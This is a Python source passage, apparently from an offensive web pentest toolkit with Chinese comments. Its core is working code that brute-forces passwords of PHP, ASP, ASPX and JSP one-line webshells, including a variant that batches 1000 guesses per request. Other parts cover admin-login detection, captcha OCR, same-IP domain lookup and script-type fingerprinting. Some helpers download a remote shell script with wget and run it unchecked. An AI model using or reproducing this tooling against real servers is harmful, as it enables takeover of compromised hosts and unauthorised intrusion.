                if re.match(r"http.*", yanzhengma_src):
                    yanzhengma_src_url = yanzhengma_src
                else:
                    pure_url = parsed.scheme + "://" + parsed.netloc + parsed.path
                    yanzhengma_src_url = url[
                        :(len(pure_url) - len(pure_url.split("/")[-1]))] + yanzhengma_src
            return {
                'yanzhengma_form_name': yanzhengma_form_name,
                'yanzhengma_src': yanzhengma_src_url}
    return None


def crack_ext_direct_webshell_url(url, pass_dict_file, ext):
    # 爆破php|asp|aspx|jsp的一句话类型的webshell
    # 表单形式爆破的webshell爆破起来方法一样,不用分类
    # 一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破
    def ext_direct_webshell_crack_thread(password, url, ext):
        if get_flag[0] == 1:
            return
        if ext in ["php", "asp", "aspx"]:
            pattern = re.compile(r"29289", re.I)
        if ext == "jsp":
            pattern = re.compile(r"->\|.+\|<-", re.I)

        if ext == "php":
            # php的echo 29289后面必须加分号
            # 后来发现这里不能用echo 29289,因为assert和echo不搭配[如果等待被暴破的webshell不是eval...而是
            # assert形式,这样的情况不能用echo来判断,因为assert不能执行echo]
            values = {'%s' % password: 'print_r("29289");'}
        elif ext == "asp":
            # asp后面不能加分号
            values = {'%s' % password: 'response.write("29289")'}
        elif ext == "aspx":
            # aspx后面可加可不加分号
            values = {'%s' % password: 'Response.Write("29289");'}
        elif ext == "jsp":
            # jsp一句话比较特殊,似乎没有直接执行命令的post参数
            # A后面没有分号
            # jsp一句话中:
            # A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            # B参数是列目录
            # C参数是读文件
            # D,E,F,....参考jsp菜刀一句话服务端代码
            values = {'%s' % password: 'A'}

        try_time[0] += 1

        # post_request可处理表单post和无表单post,以及code=404的状况
        html = post_request(url, values)

        PASSWORD = "(" + password + ")" + (52 - len(password)) * " "
        sys.stdout.write('-' * (try_time[0] * 100 // (sum[0])) + '>' + str(
            try_time[0] * 100 // (sum[0])) + '%' + '%s/%s %s\r' % (try_time[0], sum[0], PASSWORD))
        sys.stdout.flush()

        if re.search(pattern, html):
            get_flag[0] = 1
            end = time.time()
            # print "\b"*30
            # sys.stdout.flush()
            print(Fore.RED + "congratulations!!! webshell cracked succeed!!!")
            string = "cracked webshell:%s password:%s" % (url, password)
            return_password[0] = password
            print(Fore.RED + string)
            print("you spend time:" + seconds2hms(end - start[0]))
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程

    def crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext):
        urls = []
        exts = []
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            exts.append(ext)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = i
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            # 用executor.map不会出来，应该是死锁了,换成更细粒度的executor.submit方法
            executor.map(ext_direct_webshell_crack_thread,
                         passwords, urls, exts, timeout=30)

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip3 install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    return_password = [""]

    crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext)
    return {'cracked': get_flag[0], 'password': return_password[0]}


def jie_di_qi_crack_ext_direct_webshell_url(url, pass_dict_file, ext):
    # 爆破php|asp|aspx|jsp的一句话类型的webshell
    # 表单形式爆破的webshell爆破起来方法一样,不用分类
    # 一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破

    def ext_direct_webshell_crack_thread(password, url, ext):
        values = {}
        check_values = {}
        if get_flag[0] == 1:
            return
        if ext in ["php", "asp", "aspx"]:
            pattern = re.compile(r"29289", re.I)
        if ext == "jsp":
            pattern = re.compile(r"->\|.+\|<-", re.I)

        if ext == "php":
            # php的echo 29289后面必须加分号
            # 后来发现这里不能用echo 29289,因为assert和echo不搭配[如果等待被暴破的webshell不是eval...而是
            # assert形式,这样的情况不能用echo来判断,因为assert不能执行echo]
            for each in password:
                values[each] = 'print_r("29289");'
                check_values[each] = 'print_r("%s");' % each
        elif ext == "asp":
            # asp后面不能加分号
            for each in password:
                values[each] = 'response.write("29289")'
                check_values[each] = 'response.write("%s")' % each
        elif ext == "aspx":
            # aspx后面可加可不加分号
            for each in password:
                values[each] = 'Response.Write("29289");'
                check_values[each] = 'Response.Write("%s");' % each
        elif ext == "jsp":
            # jsp一句话比较特殊,似乎没有直接执行命令的post参数
            # A后面没有分号
            # jsp一句话中:
            # A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            # B参数是列目录
            # C参数是读文件
            # D,E,F,....参考jsp菜刀一句话服务端代码
            for each in password:
                values[each] = 'A'

        #data = urllib.parse.urlencode(values)

        try_time[0] += 1

        # post_request可处理表单post和无表单post,以及code=404的状况
        html = post_request(url, values)

        sys.stdout.write('-' * (try_time[0] * 100 // (sum[0])) + '>' + str(
            try_time[0] * 100 // (sum[0])) + '%' + ' %s/%s\r' % (try_time[0], sum[0]))
        sys.stdout.flush()
        if re.search(pattern, html):
            get_flag[0] = 1
            # print "\b"*30
            # sys.stdout.flush()
            print(Fore.RED + "congratulations!!! find webshell password group,now try to get the only one password...")
            if ext != "jsp":
                # html即为密码内容
                html = post_request(url, check_values)
                final_password = html
            else:
                for each in password:
                    post_values = {'%s' % each: 'A'}
                    html = post_request(url, post_values)
                    if re.search(pattern, html):
                        final_password = each
                        break

            string = "cracked webshell:%s password:%s" % (url, final_password)
            return_password[0] = final_password
            print(Fore.RED + string)
            end = time.time()
            print("you spend time:" + seconds2hms(end - start[0]))
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程

    def crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext):
        urls = []
        exts = []
        passwords = []
        passwords_i = []
        i = 0
        j = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")

        for each in f:
            each = re.sub(r"(\s)$", "", each)
            if (j + 1) % 1000 != 0:
                passwords_i.append(each)
            if (j + 1) % 1000 == 0:
                passwords_i.append(each)
                passwords.append(passwords_i)
                urls.append(url)
                exts.append(ext)
                passwords_i = []
            i += 1
            j += 1

        if (j) % 1000 != 0:
            passwords.append(passwords_i)
            urls.append(url)
            exts.append(ext)

        f.close()
        sum[0] = i // 1000 + 1 + 1
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        # 用接地气思路爆破webshell时不能用多线程,x1000倍爆破速度会让web server认为每次参数个数>1000
        '''
        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            # 用executor.map不会出来，应该是死锁了,换成更细粒度的executor.submit方法
            executor.map(ext_direct_webshell_crack_thread, passwords, urls, exts, timeout=30)
        '''
        for i in range(sum[0] - 1):
            ext_direct_webshell_crack_thread(passwords[i], url, ext)

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip3 install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    return_password = [""]

    crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext)
    return {'cracked': get_flag[0], 'password': return_password[0]}


def get_csrf_token_value_from_html(html):
    html = re.sub(r"<!--.*-->", "", html)
    param_part = get_param_part_from_content(html)
    find_csrf_token = re.search(
        r"([^&?]*token[^=]*)=([^&]+)", param_part, re.I)
    csrf_token_value = ""
    if find_csrf_token:
        csrf_token_value = find_csrf_token.group(2)
    return csrf_token_value


def get_value_from_url(url):
    # 返回一个字典{'y1':y1,'y2':y2}
    # eg.从http://www.baidu.com/12/2/3.php?a=1&b=2中得到
    #'y1':"http://www.baidu.com/12/2/3.php"
    #'y2':"http://www.baidu.com/12/2"
    import urllib.parse
    import re
    url = re.sub(r'\s$', '', url)
    if get_http_domain_from_url(url) in [url, url + "/"]:
        # 如果url就是http_domain
        if url[-1] == '/':
            y1 = url
            y2 = url[:-1]
        else:
            y1 = url + '/'
            y2 = url
    else:
        # url不是http_domain
        parsed = urllib.parse.urlparse(url)
        y1 = parsed.scheme + '://' + parsed.netloc + parsed.path
        y2_len = len(y1) - len(y1.split('/')[-1]) - 1
        y2 = y1[:y2_len]
    return {
        'y1': y1,
        'y2': y2}


def like_admin_login_content(html):
    # 根据html内容判断页面是否可能是管理员登录页面
    user_pass_form = get_user_and_pass_form_from_html(html)
    user_form_name = user_pass_form['user_form_name']
    pass_form_name = user_pass_form['pass_form_name']
    if user_form_name is not None and pass_form_name is not None:
        return True
    else:
        return False


def like_admin_login_url(url):
    # 判断url对应的html内容是否可能是管理员登录页面
    html = get_request(url, by="selenium_phantom_js")['content']
    return like_admin_login_content(html)


class MyThread(threading.Thread):

    def __init__(self, func, args, name=''):
        threading.Thread.__init__(self)
        self.name = name
        self.func = func
        self.args = args

    def run(self):
        self.result = self.func(*self.args)

    def get_result(self):
        return self.result


def get_domain_key_value_from_url(url):
    # 从url中得到域名的关键值
    # eg.从http://www.baidu.com中得到baidu
    url = re.sub(r"(\s)$", "", url)
    http_domain = get_http_domain_from_url(url)
    domain = http_domain.split("//")[-1]
    num = len(domain.split("."))
    if num == 2:
        return domain.split(".")[0]
    if num > 2:
        if domain.split(".")[1] not in [
            'com',
            'cn',
            'org',
            'gov',
            'net',
            'edu',
            'biz',
            'info',
            'me',
            'uk',
            'hk',
            'tw',
            'us',
            'it',
            'in',
            'fr',
            'de',
            'co',
            'cc',
            'cm',
            'pro',
            'br',
                'tv']:
            return domain.split(".")[1]
        else:
            return domain.split(".")[0]


def post_html_handler(html):
    # 处理爬虫遇到包含post数据的html(url)的情况
    if not re.search(r'''type=('|")?submit('|")?''', html, re.I):
        return


def url_is_sub_domain_to_http_domain(url, http_domain):
    main_domain_prefix = re.search(
        r"http(s)?://([^\.]*)\.([^\./]*)",
        http_domain).group(2)
    main_domain_key_value = re.search(
        r"http(s)?://([^\.]*)\.([^\./]*)", http_domain).group(3)
    if re.match(
        r"http(s)?://[^\.]*(?<!%s)\.%s" %
        (main_domain_prefix,
         main_domain_key_value),
            url) and get_domain_key_value_from_url(url) == get_domain_key_value_from_url(http_domain):
        return True
    return False


def get_yanzhengma_from_pic(img, cleanup=True, plus=''):
    # 调用系统安装的tesseract来识别验证码
    # cleanup为True则识别完成后删除生成的文本文件
    # plus参数为给tesseract的附加高级参数
    # print get_string_from_yanzhengma('2.jpg')  # 打印识别出的文本,删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False)  # 打印识别出的文本,不删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False, '-l eng')  #
    # 打印识别出的文本,不删除txt文件,同时提供高级参数
    command_output = get_string_from_command("tesseract")
    if re.search(r'tesseract not found', command_output):
        os.system(
            "wget https://raw.githubusercontent.com/3xp10it/mytools/master/install_tesseract.sh")
        os.system("chmod +x install_tesseract.sh")
        os.system("./install_tesseract.sh")
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件
    else:
        get_string_from_command(
            'tesseract ' +
            img +
            ' ' +
            img +
            ' ' +
            plus)  # 生成同名txt文件

    with open(img + ".txt", "r+") as f:
        text = f.read()
    text = re.sub(r"\s", "", text)
    if cleanup:
        os.remove(img + '.txt')
    return text


def get_string_from_url_or_picfile(url_or_picfile):
    # 从url或图片文件中得到验证码,不支持jpeg,支持png
    from PIL import Image
    # from pytesseract import *
    # from urllib.request import urlretrieve

    def get_pic_from_url(url, save_pic_name):
        # 这里不打印wget的执行过程
        get_string_from_command("wget %s -O temp.png" % url)

    if url_or_picfile[:4] == "http":
        get_pic_from_url(url_or_picfile, 'temp.png')
        im = Image.open("temp.png")
    else:
        im = Image.open(url_or_picfile)

    nx, ny = im.size
    im2 = im.resize((int(nx * 5), int(ny * 5)), Image.BICUBIC)
    im2.save("temp2.png")

    # 下面这两句会在电脑上打开temp2.png
    # enh = ImageEnhance.Contrast(im)
    # enh.enhance(1.3).show("30% more contrast")
    string = get_yanzhengma_from_pic("temp2.png")
    get_string_from_command("rm temp.png temp2.png")
    return string


def get_input_intime1(default_choose, timeout=30):
    # http://www.cnblogs.com/jefferybest/archive/2011/10/09/2204050.html
    # 在一定时间内得到选择的值,如果没有选择则返回默认选择
    # 第一个参数为默认选择值
    # 第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    # 返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型

    import readline
    default_choose = [default_choose]
    timeout = [timeout]
    choosed = [0]
    chioce = ['']

    def print_time_func():
        print("Please input your choice before timeout")
        while choosed[0] == 0 and timeout[0] > 0:
            time.sleep(1)
            sys.stdout.write(
                '\r' + ' ' * (len(readline.get_line_buffer()) + 2) + '\r')
            sys.stdout.write("\r%ss " % timeout[0])
            sys.stdout.write('>>: ' + readline.get_line_buffer())
            sys.stdout.flush()
            timeout[0] -= 1
        if choosed[0] == 0:
            chioce[0] = default_choose[0]

    def input_func():
        while choosed[0] == 0 and timeout[0] > 0:
            s = input('>>: ')
            #rlist, _, _ = select([sys.stdin], [], [], timeout[0])
            if len(s) == 0:
                chioce[0] = default_choose[0]
            else:
                chioce[0] = s
                print("U choosed:-------------------------(%s)" % chioce[0])
            choosed[0] = 1
    time_left_thread = MyThread(print_time_func, ())
    input_thread = MyThread(input_func, ())
    time_left_thread.start()
    input_thread.set_daemon(True)
    input_thread.start()
    time_left_thread.join()
    if choosed[0] == 0 or chioce[0] == default_choose[0]:
        print("U choose default:-------------------------(%s)" % chioce[0])
    return chioce[0]


def get_input_intime(default_choose, timeout=30):
    # http://www.cnblogs.com/jefferybest/archive/2011/10/09/2204050.html
    # 在一定时间内得到选择的值,如果没有选择则返回默认选择
    # 第一个参数为默认选择值
    # 第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    # 返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型
    # 无法输入长字符串,适用于只输入1-2个字符长度的字符串,一般用于选项的选择
    import readline
    default_choose = [default_choose]
    timeout = [timeout]
    choosed = [0]
    chioce = ['']

    def print_time_func():
        while choosed[0] == 0 and timeout[0] > 0:
            time.sleep(1)
            sys.stdout.write(
                '\r' + ' ' * (len(readline.get_line_buffer()) + 2))
            sys.stdout.write(
                "\r%s seconds left...please input your chioce:>" % timeout[0])
            sys.stdout.write(readline.get_line_buffer())
            timeout[0] -= 1
        if choosed[0] == 0:
            chioce[0] = default_choose[0]

    def input_func():
        from select import select
        rlist, _, _ = select([sys.stdin], [], [], timeout[0])
        if rlist:
            s = sys.stdin.readline()
            if len(s) == 1:
                chioce[0] = default_choose[0]
                choosed[0] = 1
                print("you choosed the default chioce:%s" % default_choose[0])
            else:
                chioce[0] = s[:-1]
                choosed[0] = 1
                print("you choosed %s" % chioce[0])
        else:
            pass
            #print("you input nothing")

    time_left_thread = MyThread(print_time_func, ())
    input_thread = MyThread(input_func, ())
    time_left_thread.start()
    input_thread.start()
    time_left_thread.join()

    if choosed[0] == 0:
        print("\n")
        print("i choose the default chioce for you:>>>%s<<<" % chioce[0])
    return chioce[0]


def able_connect_site(site):
    # 检测与site之间是否能成功连接
    import os
    import re
    # windows:-n 2
    # linux:-c 2
    # 如果不存在配置文件则要求可访问google才返回1
    a = 'wget %s --timeout=7 -O /tmp/able_connect_site' % site
    output = get_string_from_command(a)
    os.system("rm /tmp/able_connect_site")
    if re.search(r"200 OK", output, re.I):
        return 1
    else:
        return 0


def search_key_words(key_words, by='bing'):
    # 通过搜索引擎搜索关键字
    # 返回搜索得到的html页面
    # 默认用bing搜索引擎
    bing_search = "http://cn.bing.com/search?q="
    baidu_search = "http://www.baidu.com/s?wd="
    return_value = ''
    if by == 'bing':
        result = get_request(bing_search + key_words, by="selenium_phantom_js")
        return_value = result['content']
    if by == 'baidu':
        result = get_request(baidu_search + key_words,
                             by="selenium_phantom_js")
        return_value = result['content']
    return return_value


def collect_urls_from_url(url):
    import requests
    import chardet
    return_value = {}
    rsp = requests.get(url,timeout=30,verify=False)
    code = rsp.status_code
    content = rsp.content
    bytes_encoding = chardet.detect(content)['encoding']
    content = content.decode(encoding=bytes_encoding, errors="ignore")
    has_title = re.search(r"<title>([\s\S]*)</title>", content, re.I)
    if has_title:
        title = has_title.group(1)
    else:
        title = ""
    return_value['y1'] = collect_urls_from_html(content, url)
    return_value['y2'] = {'code': code, 'title': title, 'content': content}
    return return_value


def collect_urls_from_html(content, url):
    from urllib.parse import urljoin
    import html
    all_uris = []
    return_all_urls = []

    a = re.search(r'''(<form\s+.+>)''', content, re.I)
    if a:
        if "action=" in a.group(1):
            pure_action_value = re.search(
                r'''action=('|")?([^\s'"<>]*)('|")?''', a.group(1), re.I).group(2)
        else:
            # eg.url=http://192.168.93.139/dvwa/vulnerabilities/xss_s/
            pure_action_value = url.split("?")[0]
        pure_action_value = urljoin(url, pure_action_value)

        if re.search(r'''\smethod\s*=\s*('|")?POST('|")?''', a.group(1), re.I):
            # post表单
            form_action_value = pure_action_value + "^" + \
                get_param_part_from_content(content)

        else:
            # get表单
            if "?" not in pure_action_value:
                form_action_value = pure_action_value + "?" + \
                    get_param_part_from_content(content)
            else:
                param_part = get_param_part_from_content(content)
                content_param_list = get_param_list_from_param_part(param_part)
                url_param_list = get_param_list_from_param_part(
                    url[url.find("?") + 1:])
                new_param_part = ""
                for each_param in content_param_list:
                    if each_param not in url_param_list:
                        each_param_value = re.search(
                            r"%s(\=[^&]*)" % each_param).group(1)
                        new_param_part += (each_param + each_param_value + "&")
                if new_param_part != "":
                    new_param_part = new_param_part[:-1]
                    form_action_value = pure_action_value + "&" + new_param_part
                else:
                    form_action_value = pure_action_value

        all_uris.append(form_action_value)

    bs = BeautifulSoup(content, 'lxml')
    if re.match(
        r"%s/*((robots\.txt)|(sitemap\.xml))" %
        get_http_domain_pattern_from_url(url),
            url):
        if re.search(r"(robots\.txt)$", url):
            # 查找allow和disallow中的所有uri
            find_uri_pattern = re.compile(
                r"((Allow)|(Disallow)):[^\S\n]*(/[^?\*\n#]+)(/\?)?\s", re.I)
            find_uri = re.findall(find_uri_pattern, content)
            if find_uri:
                for each in find_uri:
                    all_uris.append(each[3])
            # 查找robots.txt中可能存在的sitemap链接
            find_sitemap_link_pattern = re.compile(
                r"Sitemap:[^\S\n]*(http[\S]*)\s", re.I)
            find_sitemap_link = re.findall(find_sitemap_link_pattern, content)
            if find_sitemap_link:
                for each in find_sitemap_link:
                    all_uris.append(each)

        if re.search(r"(sitemap\.xml)$", url):
            find_url_pattern = re.compile(
                r'''(http(s)?://[^\s'"#<>]+).*\s''', re.I)
            find_url = re.findall(find_url_pattern, content)
            if find_url:
                for each in find_url:
                    all_uris.append(each[0])

    else:
        for each in bs.find_all('a'):
            # 收集a标签(bs可以收集到不带http_domain的a标签)
            find_uri = each.get('href')
            if find_uri is not None:
                if re.match(r"^javascript:", find_uri):
                    continue
                else:
                    find_url = urljoin(url, find_uri)
                    all_uris.append(find_url)
        # 收集src="http:..."中的uri
        for each in bs.find_all(src=True):
            find_uri = each.get('src')
            if find_uri is not None:
                find_url = urljoin(url, find_uri)
                all_uris.append(find_url)

    # 整理uri,将不带http_domain的链接加上http_domain,并将多余的/去除
    for each in all_uris:
        if each not in [None, "http://", "https://"]:
            if not re.match(r"^http", each):
                if each[:2] == "//":
                    each = url.split(":")[0] + ":" + each
                else:
                    each = get_value_from_url(url)['y2'] + '/' + each
            # 将多余的/去除
            http_prefix = each.split(":")[0] + "://"
            nothttp_prefix = each[len(http_prefix):]
            nothttp_prefix = re.sub(r"/+", "/", nothttp_prefix)
            each = http_prefix + nothttp_prefix
            each = html.unescape(each)
            if each not in return_all_urls:
                return_all_urls.append(each)
    # 暂时不考虑将如http://www.baidu.com/1.php?a=1&b=2整理成http://www.baidu.com/1.php

    # 整理所有url,将其中带有单引号和双引号和+号的url过滤掉
    final_return_urls = []
    for each in return_all_urls:
        if "'" in each or '"' in each or "{" in each or "(" in each or "[" in each or each[-3:] == ".js" or ".js?" in each or each[-4:] == ".css" or ".css?" in each or '\\' in each:
            pass
        else:
            final_return_urls.append(each)
    return final_return_urls
    # return {'y1': final_return_urls, 'y2': result}


def get_http_or_https_from_search_engine(domain):
    # 从搜索引擎中得到domain是http还是https
    bing_search = "http://cn.bing.com/search?q="
    url = bing_search + "site:" + domain
    urls_list = collect_urls_from_url(url)['y1']
    http_num = https_num = 0
    for each in urls_list:
        if "http://" + domain in each:
            http_num += 1
        if "https://" + domain in each:
            https_num += 1
    if http_num >= https_num and http_num != 0:
        return "http"
    elif http_num < https_num and https_num != 0:
        return "https"
    else:
        # 由搜索引擎判断是http还是https失败[可能是搜索引擎没有收录],返回0
        return 0


def get_http_or_https(domain):
    # 获取domain对应的scheme,如获取www.baidu.com对应的scheme为https,此功能待完善
    # 如果首先请求http成功,则认为是http,不再去看https,因为https有可能是cdn强加的,而它本身是http
    # 不连接vpn访问http://{domain}无法访问,访问https://{domian}却可以访问,这样的情况下可能是这个domain被GFW拦截了
    #.这样的话用exp10it.py模块中的get_http_or_https会得到是https
    # 连接vpn访问http://{domain}可以正常访问,访问https://{domain}也可以正常访问,这样的情况下可能是cdn强制给
    # domain加的https[eg.cloudflare].这样的话用exp10it.py模块中的get_http_or_https会得到http
    # 因此,在尝试获取domain的cdn背后的真实ip时,exp10it.py模块中的get_http_or_https可能因此而受干扰[GFW+cdn]
    # 因此,修改exp10it.py模块中的get_http_or_https函数,先用baidu[site:{domain}]这样查一下对方是http还是https,如果
    # 得不到再用原来get_http_or_https的方法继续

    # 首先由搜索引擎尝试获取
    bing_has_record = False
    bing_record = get_http_or_https_from_search_engine(domain)
    if bing_record != 0:
        bing_has_record = True
    else:
        pass
    # 下面正常通过分别访问http和https页面的情况来判断
    _1 = get_request("http://" + domain, by="MechanicalSoup")
    http_title = _1['title']
    http_code = _1['code']
    http_content = _1['content']
    _2 = get_request("https://" + domain, by="MechanicalSoup")
    https_title = _2['title']
    https_code = _2['code']
    https_content = _2['content']
    if http_title == https_title:
        return "http"
    else:
        if http_code == 200 and https_code != 200:
            return "http"
        if https_code == 200 and http_code != 200:
            return "https"
        if http_code == 200 and https_code == 200:
            if bing_has_record:
                return bing_record
            elif len(http_content) >= len(https_content):
                return "http"
            else:
                return "https"

    return "http"


def get_ip(domain):
    # 从domain中获取ip
    import socket
    try:
        myaddr = socket.getaddrinfo(domain, 'http')[0][4][0]
        return myaddr
    except:
        print("getip wrong")


def get_pure_list(list):
    # this is a function to remove \r\n or \n from one sting
    # 得到域名列表
    pure_list = []
    for each in list:
        each = re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)', "", each)
        pure_list.append(each)
        # re.sub(r'\r\n',"",each)
        # re.sub(r'\n',"",each)
    return pure_list


def save_url_to_file(url_list, name):
    # this is my write url to file function:
    file = open(name, "a+")
    file.close()
    for ur in url_list:
        file = open(name, "r+")
        all_lines = file.readlines()
        # print(all_lines)
        # print((len(all_lines)))
        file.close()
        # if ur+"\r\n" not in all_lines:
        if ur + "\n" not in all_lines:
            file = open(name, "a+")
            file.write(ur + "\r\n")
            file.flush()
            file.close()


def get_ip_domains_list(ip):
    # 不再用bing接口查询旁站
    resp = get_request(
        "https://x.threatbook.cn/7e2935f1ac5e47fd8ae79305f36200c8/ip_relatives?ip=%s&domain=fuck.com" %
        ip, by="MechanicalSoup")
    html = resp['content']
    import re
    return_domain_list = re.findall(r'''target="_blank">(.*)</a>''', html)
    # print(all)
    # print(len(all))
    # print(html)
    return return_domain_list


def get_root_domain(domain):
    # 得到domain的根域名,eg.www.baidu.com得到baidu.com
    # domain可为http开头或纯domain,不能是非http://+domain的url
    if domain[:4] != "http":
        key = get_domain_key_value_from_url("http://" + domain)
    else:
        key = get_domain_key_value_from_url(domain)
    index = domain.find(key, 0)
    return domain[index:]


def get_root_domain_bak(domain):
    # 得到domain的根域名,eg.www.baidu.com得到baidu.com
    # domain可为http开头或纯domain,不能是非http://+domain的url
    if domain[:4] == "http":
        domain = domain.split("/")[-1]
    split_list = domain.split(".")
    i = 1
    return_value = ""
    while i > 0:
        a = "." + split_list[-i]
        if a in domain_suf_list and a not in [".bing", ".baidu", ".google", ".yahoo"]:
            i += 1
            return_value = a + return_value
        else:
            break
    return_value = split_list[-i] + return_value
    return return_value


def is_wrong_html(html):
    import re
    pattern = re.compile(
        r".*((sorry)|(不存在)|(not exist)|(page not found)|(抱歉)).*", re.I)
    # pattern=re.compile(r"不存在")
    if re.search(pattern, html):
        return True
    else:
        return False


def get_target_script_type(target):
    # 得到target的脚本类型
    # target要是http(s)+domain格式
    # 此处不考虑html静态类型,如果没有找到,默认返回php
    from concurrent import futures
    target = [target]
    name_list = [
        'index',
        'main',
        'info',
        'default',
        'start',
        'login',
        'admin',
        'menu',
        'test',
        'base',
        'config',
        'about',
        'configuration',
        '1',
        'l',
        'tmp']
    script_type_list = ['php', 'asp', 'aspx', 'jsp']
    return_value = []

    def check_uri(uri):
        if uri.split(".")[-1] in return_value:
            return
        result = get_request(target[0] + uri, by="MechanicalSoup")
        if 200 == result['code'] and not is_wrong_html(result['content']):
            if uri.split(".")[-1] not in return_value:
                return_value.append(uri.split(".")[-1])

    def check_with_type(type):
        type = [type]
        new_name_list = []

        def make_uri(name):
            new_name_list.append("/" + name + "." + type[0])

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(make_uri, name_list)

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_uri, new_name_list)

    with futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_with_type, script_type_list)

    if return_value == []:
        return_value=['php','jsp']

    return return_value


def static_sqli(url):
    # re.search("",url)
    pass


def get_server_type(url):
    # 得到url对应web服务器的类型,eg.apache,iis,nginx,lighttpd
    # phpstudy中试验上面4种的php默认post参数最大个数为1000个
    import requests
    r = requests.get(url,timeout=30,verify=False)
    server_type = r.headers['server']
    return server_type


def get_cms_entry_from_start_url(start_url):
    # eg.start_url="http://192.168.1.10/dvwa/index.php"
    # return:"http://192.168.1.10/dvwa/"
    # eg.start__url="http://192.168.1.10:8000"
    # return:"http://192.168.1.10:8000/"
    from urllib.parse import urlparse
    parsed = urlparse(start_url)
    path = parsed.path
    if "/" in path:
        file_part = path.split("/")[-1]
        if "." in file_part:
            file_part_index = start_url.find(file_part)
            return_value = start_url[:file_part_index]
        else:
            if path[-1] != "/":
                path = path + "/"
            return_value = parsed.scheme + "://" + parsed.netloc + parsed.path
    else:
        return_value = start_url + "/"
    return return_value


def start_ipproxypool():
    # 默认在8000端口开服务
    if not os.path.exists("IPProxyPool"):
        cmd = "cd %s && git clone https://github.com/qiyeboy/IPProxyPool.git && cd IPProxyPool && pip install -r requirements.txt" % WORK_PATH
        # input(cmd)
        os.system(cmd)
    else:
        pass
        # cmd = "cd %s && git pull" % (WORK_PATH + "/IPProxyPool")
        # input(cmd)
        # os.system(cmd)
    cmd = "cd %s && nohup python2 IPProxy.py > IPProxyPool.log &" % (
        WORK_PATH + "/IPProxyPool")
    # input(cmd)
    os.system(cmd)


def start_scrapy_splash():
    os.system("docker run -p 8050:8050 scrapinghub/splash --max-timeout 3600")

def start_web_server(host,port,rules):
    #eg.rules={'GET':get,'POST':post}
    #def get(self):
    #    from urllib.parse import parse_qs
    #    headers = str(self.headers)
    #    if self.path!='/favicon.ico':
    #        query_dict=parse_qs(self.path[2:])
    #        #注意,下面这行_set_headers()是必须加上的,否则浏览器访问当前服务会异常
    #        self._set_headers()
    #        self.wfile.write(bytes(str(query_dict), "utf-8"))
    #start_web_server(host='0.0.0.0',port=8888,rules=rules)
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from socketserver import ThreadingMixIn
    from urllib.parse import parse_qs

    class ThreadingHttpServer(ThreadingMixIn, HTTPServer):
        pass

    class S(BaseHTTPRequestHandler):
        def _set_headers(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_GET(self):
            rules['GET'](self)

        def do_POST(self):
            rules['POST'](self)

    def run(server_class=ThreadingHttpServer, handler_class=S):
        server_address = (host, int(port))
        httpd = server_class(server_address, handler_class)
        print('Starting httpd on '+host+':'+str(port))
        httpd.serve_forever()

    run()

